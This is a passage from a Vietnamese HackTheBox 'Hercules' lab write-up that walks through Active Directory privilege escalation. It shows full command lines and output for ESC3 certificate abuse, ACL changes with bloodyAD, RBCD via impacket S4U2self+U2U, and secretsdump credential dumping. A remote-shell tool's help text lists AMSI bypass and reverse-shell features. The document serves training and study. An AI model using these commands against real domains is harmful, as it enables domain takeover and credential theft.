    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.**
```

Giờ thì mình đã check trên `fernando.r` , giờ thì mục tiêu tiếp theo là gì ? 

![image](/assets/images/HTB/season9/Hercules/image%2088.png)

Nhìn thấy thì nó trỏ về `ashley.b` chứ ko phải vì nó từ path này. 

Mình cũng nhận được các mail liên quan đến Ashley.b và user này có script dọn dẹp nên chắc chắn cần phải gở bỏ tập lệnh này.

→ Các bước như sau: 

**Step 1: Dùng certipy để request 1 enrollment agent certificate** 

![image](/assets/images/HTB/season9/Hercules/image%2089.png)

**Step 2: Dùng enrollment agent certificate đó để thay thế các user khác đưa ra yêu cầu certifiacate template chỉ cho phép xác thực và cho phép đăng ký agent enrollment.** 

![image](/assets/images/HTB/season9/Hercules/image%2090.png)

**Step 3: Request 1 ticket granting ticket (TGT) từ domain, chỉ định danh tính mục tiêu cần mạo danh và chứng chỉ có định PFX được tạo ở bước 2.**

![image](/assets/images/HTB/season9/Hercules/image%2091.png)

Giờ mục tiêu kế tiếp là `iis_administrator` 

### Privilege Escalation

![image](/assets/images/HTB/season9/Hercules/image%2092.png)

Nhìn thấy thì account này ko enable và `Admin Count` được set thành `TRUE` vì vậy mình ko thể re-enable được.

→ Vì vậy `ashley.b` sẽ giúp mình làm điều này. 

Mình sẽ phải check path từ `iis_administrator` tới `administrator` 

![image](/assets/images/HTB/season9/Hercules/image%2093.png)

Mình có `iis_administrator` là member của group `SERVICE OPERATORS@HERCULES.HTB` mà mình có thể `ForgeChangePassword` tới `iis_webserver$` và user này có thể `AllowedToAct` tới `DC.HERCULES.HTB` 

→ Khi mà mình có DC, mình có thể đơn giản dump hết tất cả hash để tiếp cận `administrator` 

### Lateral Movement

---

Request TGT cho **`ashley.b`** 

![image](/assets/images/HTB/season9/Hercules/image%2094.png)

Tiếp cận account **`ashley.b`** và session này, đồng thời nó cũng là member của **`REMOTE MANAGEMENT@HSERCULES.HTB`** 

```bash
**┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ klist
Ticket cache: FILE:/home/kali/Desktop/shadow_credentials/ashley.b.ccache
Default principal: ashley.b@HERCULES.HTB

Valid starting       Expires              Service principal
12/01/2025 16:43:24  12/02/2025 02:43:24  krbtgt/HERCULES.HTB@HERCULES.HTB
        renew until 12/02/2025 16:43:22
                                                                                                                      
┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb       
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\ashley.b
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\ashley.b\Documents> cd ..\Desktop
PS C:\Users\ashley.b\Desktop> dir

    Directory: C:\Users\ashley.b\Desktop

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Mail                                                                  
-a----         12/4/2024  11:45 AM            102 aCleanup.ps1                                                          

PS C:\Users\ashley.b\Desktop>**
```

Mình sẽ check **`\Mail`** folder

```bash
**PS C:\Users\ashley.b\Desktop> cd Mail
PS C:\Users\ashley.b\Desktop\Mail> dir

    Directory: C:\Users\ashley.b\Desktop\Mail

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:15 AM           1694 RE_ashley.eml                                                         

PS C:\Users\ashley.b\Desktop\Mail> type RE_ashley.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
        boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

Hello Ashley,

The issue you are facing is that some members in the Department were once p=
art of sensitive groups which are blocking your permissions.

I've discussed your issue at length with security and here is a solution th=
at we feel works for both us and your team. I've attached a copy of the scr=
ipt your team should run to your home folder. For convenience, We have prov=
ided a shortcut to the script in the IT share. You may also run the task ma=
nually from powershell.

If you have any other issues feel free to inform me.

Regards, Domain Admins.

________________________________
From: Ashley Browne
Sent: Monday 09:49:37 AM
To: Domain Admins <Administrator@HERCULES.HTB>
Subject: Unable to reset user's password.

Good Morning,

Today one of my staff received a password reset request from a user, but fo=
r some reason they were unable to perform the action due to invalid permiss=
ions. I have double checked against another user and confirmed our team has=
permission to handle password changes in the department the user belongs to=
. I was told to contact you for further assistance.

For reference the user is "will.s" from the "Engineering Department" Unit.

I look forward to your reply.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
PS C:\Users\ashley.b\Desktop\Mail>**
```

Từ nội dụng này mình có thể nhìn thấy đây là script shortcut mà mình có thể chạy manual.

→ Check nó thử. 

```bash
**PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
PS C:\Users\ashley.b\Desktop>**
```

```bash
**PS C:\Users\ashley.b> dir

    Directory: C:\Users\ashley.b

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-r---         12/4/2024  11:45 AM                Desktop                                                               
d-r---         12/4/2024  11:44 AM                Documents                                                             
d-r---          5/8/2021   6:15 PM                Downloads                                                             
d-r---          5/8/2021   6:15 PM                Favorites                                                             
d-r---          5/8/2021   6:15 PM                Links                                                                 
d-r---          5/8/2021   6:15 PM                Music                                                                 
d-r---          5/8/2021   6:15 PM                Pictures                                                              
d-----          5/8/2021   6:15 PM                Saved Games                                                           
d-----         12/4/2024  11:45 AM                Scripts                                                               
d-r---          5/8/2021   6:15 PM                Videos                                                                

PS C:\Users\ashley.b> cd Scripts
PS C:\Users\ashley.b\Scripts> dir

    Directory: C:\Users\ashley.b\Scripts

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           

PS C:\Users\ashley.b\Scripts>**
```

```bash
**PS C:\Users\ashley.b\Scripts> type cleanup.ps1
function CanPasswordChangeIn {
    param ($ace)
    if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
        return $true
    }
    return $false
}

function CanChangePassword {
    param ($target, $object)

    $acls = (Get-Acl -Path "AD:$target").Access
    foreach($ace in $acls){
        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
            return $true
        }
    }
    return $false
}

function CleanArtifacts {
    param($Object)

    Set-ADObject -Identity $Object -Clear "adminCount"
    $acl = Get-Acl -Path "AD:$Object"
    $acl.SetAccessRuleProtection($False, $False)
    Set-Acl -Path "AD:$Object" -AclObject $acl
}

$group = "HERCULES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""

foreach($object in $objects){
    if(CanChangePassword $object $group){
        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName

        foreach($DN in $Members){
            try {
                CleanArtifacts $DN
            } 
            catch {
                $_.Exception.Message | Out-File $Path -Append
            }
            "Cleanup : $DN" | Out-File $Path -Append
        }
    }
}
PS C:\Users\ashley.b\Scripts>**
```

Script này sẽ tự động clean up trong AD khi nhóm **`IT Support`** cho phép chạy change password của object. 

→ Mình thử check file **`log.txt`** 

```bash
**PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1**
```

```bash
**PS C:\Users\ashley.b\Desktop> cd ..\Scripts
PS C:\Users\ashley.b\Scripts> dir

    Directory: C:\Users\ashley.b\Scripts

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           
-a----         12/1/2025   7:52 PM           1388 log.txt                                                               

PS C:\Users\ashley.b\Scripts>**
```

```bash
**PS C:\Users\ashley.b\Scripts> type log.txt

Cleanup : CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb**
```

Mình có thể thấy ở đây ko có **`iis_administrator`** nhưng mình vẫn chưa enable và reset passsword. 

![image](/assets/images/HTB/season9/Hercules/image%2095.png)

Trong bloodhound cho mình thấy **`ashley.b`** là thành viên của **`IT SUPPORT@HERCULES.HTB`** mà có quyền để thay đổi password object 

→ Vì vậy mình sẽ dùng điểm này để cấp **`GenericAll`** trên **`Forest Migration`** tới **`IT Support`** vì vậy mình có reset **`iis_administrator`** password và **`GenericAll`** trên **`Auditor`** một lần nữa để re-enable **`iis_administrator`** 

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ export KRB5CCNAME=~/Desktop/Auditor.ccache
                                                                                                                      
┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ bloodyAD -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip 10.10.11.91 add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'IT SUPPORT'
[+] IT SUPPORT has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
                                                                                                                      
┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ bloodyAD -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip 10.10.11.91 add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB**
```

Giờ thì mình chạy lại script 

```bash
**PS C:\Users\ashley.b\Scripts> cd ..\Desktop
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
PS C:\Users\ashley.b\Desktop> cd ..\Scripts
PS C:\Users\ashley.b\Scripts> dir

    Directory: C:\Users\ashley.b\Scripts

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           
-a----         12/1/2025   8:09 PM           3234 log.txt                                                               

PS C:\Users\ashley.b\Scripts> type log.txt

Cleanup : CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV01-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV02-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=WINSRV03-2016,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=ENTERPRISE01-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=ENTERPRISE02-8.1,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Windows Computer Administrators,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

Cleanup : CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb

PS C:\Users\ashley.b\Scripts>**
```

Giờ mình nhìn thấy cleanup cho **`IIS_Administrator`** 

→ kế tiếp mình cần re-enable nó lên. 

![image](/assets/images/HTB/season9/Hercules/image%2096.png)

![image](/assets/images/HTB/season9/Hercules/image%2097.png)

Sau khi re-enable và cleanup, mình check lại.

![image](/assets/images/HTB/season9/Hercules/image%2098.png)

![image](/assets/images/HTB/season9/Hercules/image%2099.png)

Giờ thì mình reset password nó lại. 

![image](/assets/images/HTB/season9/Hercules/image%20100.png)

Request cho TGT 

![image](/assets/images/HTB/season9/Hercules/image%20101.png)

Giờ thì mình tới `iis_webserver$`

![image](/assets/images/HTB/season9/Hercules/image%20102.png)

Mình `forcechangepassword` tới `iis_webserver$` 

![image](/assets/images/HTB/season9/Hercules/image%20103.png)

Tiếp tục request TGT 

![image](/assets/images/HTB/season9/Hercules/image%20104.png)

### RBCD

---

Đầu tiên mình set môi trường 

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ export KRB5CCNAME=iis_webserver\$.ccache  
                                                                                                                      
┌──(env)─(kali㉿kali)-[~/Desktop]
└─$** 
```

Mình sẽ có được TGT thông qua hàm băm vượt qua để sử dụng RC4.

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/getTGT.py -hashes :$(pypykatz crypto nt 'Hoangphuc123@') hercules.htb/iis_webserver$
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_webserver$.ccache**
```

Sau đó lấy TGT session key. 

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/describeTicket.py iis_webserver\$.ccache | grep 'Ticket Session Key'
[*] Ticket Session Key            : 5a8572199e7fc5cc0dcf1758aef203fe
                                                                                                                      
┌──(env)─(kali㉿kali)-[~/Desktop]
└─$** 
```

Sau đó thay đổi hàm băm NT của tài khoản được kiểm soát không có SPN bằng khóa phiên TGT.

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/changepasswd.py -newhashes :5a8572199e7fc5cc0dcf1758aef203fe hercules.htb/iis_webserver$:'Hoangphuc123@'@dc.hercules.htb -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of hercules.htb\iis_webserver$
[*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).**
```

Cuối cùng, chúng ta có thể nhận được phiếu dịch vụ được ủy quyền thông qua **`S4U2self+U2U`**, tiếp theo là **`S4U2proxy`**.

> Beware that the obtain TGT session key and change controlledaccountwithoutSPN's NT hash need to do fast cause it automatically refresh really fast.
> 

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/getST.py -u2u -impersonate Administrator -spn cifs/dc.hercules.htb -k -no-pass hercules.htb/iis_webserver$
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache**
```

Sau khi có TGT **`Administrator`** thì vào bằng remote

```bash
                                                                                    
**┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ export KRB5CCNAME=~/Desktop/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
                                                                                    
┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: hercules.htb\Administrator
[*] '-spn' not specified, using HTTP/dc.hercules.htb@hercules.htb
[*] '-dc-ip' not specified, using hercules.htb

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\Administrator\Documents> cd ..\Desktop
PS C:\Users\Administrator\Desktop> dir
PS C:\Users\Administrator\Desktop> cd ..\..
PS C:\Users> dir

    Directory: C:\Users

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:37 AM                .NET v4.5                                                             
d-----         12/4/2024  11:37 AM                .NET v4.5 Classic                                                     
d-----        10/17/2025  10:28 PM                Admin                                                                 
d-----         9/24/2025   3:41 AM                Administrator                                                         
d-----         12/4/2024  11:45 AM                ashley.b                                                              
d-----         12/4/2024  11:44 AM                auditor                                                               
d-----         9/23/2025   5:36 PM                natalie.a                                                             
d-r---         12/4/2024  11:26 AM                Public                                                                

PS C:\Users> cd Admin\Desktop
PS C:\Users\Admin\Desktop> dir

    Directory: C:\Users\Admin\Desktop

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         12/1/2025   8:02 PM             34 root.txt                                                              

PS C:\Users\Admin\Desktop> type root.txt
8305c4c8b141aa6cb8213d6786afb045
PS C:\Users\Admin\Desktop>**
```

Giờ thì mình thực hiện `passing-the-ticket` bằng cách dùng `impacket-secretsdump` để dump hashes và LSA secrets

```bash
**└─$ impacket-secretsdump -k -no-pass dc.hercules.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4d4922ac5f690741fd77d8937655a391
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
<SNIP>
[*] Cleaning up...**
```

![image](/assets/images/HTB/season9/Hercules/image%20105.png)
